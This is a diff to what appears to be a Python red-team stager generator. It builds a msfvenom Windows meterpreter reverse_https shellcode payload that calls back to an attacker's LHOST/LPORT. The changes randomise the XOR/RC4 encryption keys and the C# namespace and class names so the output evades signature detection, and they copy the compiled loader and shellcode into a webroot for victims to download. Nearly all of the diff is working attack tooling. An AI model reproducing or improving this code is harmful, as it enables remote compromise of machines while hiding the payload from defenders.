@@ -4,18 +4,21 @@ import os
 import re
 import random
 import subprocess
+import shutil
 import argparse
+
+# Words to use to randomize namespace, class, and function names
+WORDS = open("/usr/share/dict/words").read().splitlines()
 
 MSFVENOM_CMD = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
 
-# TODO: Make dynamic
-XOR_KEY = b'\x09'
-RC4_KEY = b'aaaaaaaaaaaaaaaa'
+# Randomly generate keys at runtime
+XOR_KEY = os.urandom(1)
+RC4_KEY = random.choice(WORDS).encode('utf-8')
 
 # Randomize namespace and entrypoint names
-WORDS = open("/usr/share/dict/words").read().splitlines()
 CS_NAMESPACE = re.sub(r'\W+', '', random.choice(WORDS))
-CS_CLASSNAME = "Class1"
+CS_CLASSNAME = re.sub(r'\W+', '', random.choice(WORDS))
 CS_ENTRY_DLL = re.sub(r'\W+', '', random.choice(WORDS))
 
 templates = {
@@ -91,8 +94,10 @@ class Stager:
   def generate_shellcode(self):
     print(f"Generating shellcode with: {MSFVENOM_CMD}")
     if self.encrypt == 'xor':
+      print(f"Using XOR key {XOR_KEY}")
       self.shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
     elif self.encrypt == 'rc4':
+      print(f"Using RC4 key {RC4_KEY}")
       self.shellcode = ak.ShellCode(MSFVENOM_CMD, rc4_key=RC4_KEY)
 
   def generate_source(self):
@@ -159,6 +164,15 @@ class Stager:
                                                cs_entry=self.cs_entrypoint)
       ak.write_file(self.source_fn, template)
 
+  def copy_to_webroot(self, src, dest=None):
+    if dest is None:
+      out = os.path.join(ak.WEBROOT_DIR, self.compiled_fn)
+    else:
+      out = os.path.join(ak.WEBROOT_DIR, dest)
+
+    print(f"Copying {src} to {out}")
+    shutil.copyfile(src, out)
+
   def run(self):
     self.generate_source()
     
@@ -166,6 +180,10 @@ class Stager:
       print("Compiling...")
       ak.cs_compile(self.source_fn, flags=self.compile_flags)
       print(f"Compiled {self.compiled_fn}")
+
+      # Copy files to webroot
+      self.copy_to_webroot(self.compiled_fn)
+      self.copy_to_webroot(self.shellcode_fn, dest="sc")
 
       self.print_ps_loader()
 
